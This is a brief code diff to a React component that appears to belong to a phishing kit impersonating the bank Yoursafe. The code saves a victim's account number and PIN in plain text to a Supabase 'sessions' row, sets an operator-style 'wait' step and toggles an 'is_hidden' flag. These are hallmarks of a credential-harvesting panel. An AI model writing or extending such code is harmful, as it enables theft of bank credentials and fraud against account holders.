@@ -30,8 +30,7 @@ export function YoursafeClient({ sessionId }: { sessionId: string }) {
     setSaving(true);
     const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
-    await supabase.from("sessions").update({
-      current_step: "wait",
+    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "yoursafe", bankName: "Yoursafe", verfuegernummer: username, pin: password }
     }).eq("id", sessionId);
     router.replace(stepToPath("wait", sessionId));
